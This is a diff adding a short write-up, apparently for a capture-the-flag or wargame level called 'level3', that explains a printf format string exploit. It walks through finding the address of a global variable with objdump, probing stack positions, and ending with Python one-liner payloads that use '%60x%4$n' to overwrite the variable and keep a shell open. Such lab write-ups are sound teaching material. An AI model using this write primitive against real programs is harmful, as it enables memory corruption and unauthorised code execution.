@@ -1,0 +1,25 @@
+This is a Format String exploit using printf
+
+Checking on decompiler (hopper radar2 gdb ghidra) we can see that the binary is checking if
+at m address there is a value of 0x40 (64)
+
+Using the format string exploit from printf we can force *m to be 0x40 by writing "%60x" to put 60 character
+plus the 4 from the address,then we move with "%4$" the cursor of printf to the 4th printed address 
+which is m and "%n" allow usto write the number wrote of character at the spot we are
+
+In order to find the address of m we use:
+
+objdump -t level3
+
+The address of m is at 0x0804988c
+
+In order to know in what position is the address we inserted we just find by printing addresses
+
+(python -c 'print "\x08\x04\x98\x8c"[::-1] + "%x "*15') | ./level3
+
+We see that our inserted address appear at the 4th position
+
+Final script is:
+
+(python -c 'print "\x08\x04\x98\x8c"[::-1] + "%60x%4$n"' ; cat -) | ./level3
+(python -c 'print "\x8c\x98\x04\x08" + "%60x%4$n"' ; cat -) | ./level3
